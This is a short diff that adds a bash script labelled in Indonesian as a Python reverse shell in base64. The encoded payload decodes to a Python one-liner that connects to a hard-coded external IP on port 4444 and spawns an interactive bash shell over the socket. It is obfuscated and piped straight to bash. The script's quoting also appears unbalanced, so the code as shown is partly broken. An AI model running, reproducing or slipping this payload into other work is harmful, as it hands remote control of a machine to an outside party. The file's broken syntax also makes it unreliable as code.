@@ -1,0 +1,4 @@
+#!/bin/bash
+
+# Reverse Shell dengan Python (Base64)
+echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAzLjYwLjEyLjI2Iiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMik7cHR5LnNwYXduKCIvYmluL2Jhc2giKVsn | base64 -d | bash
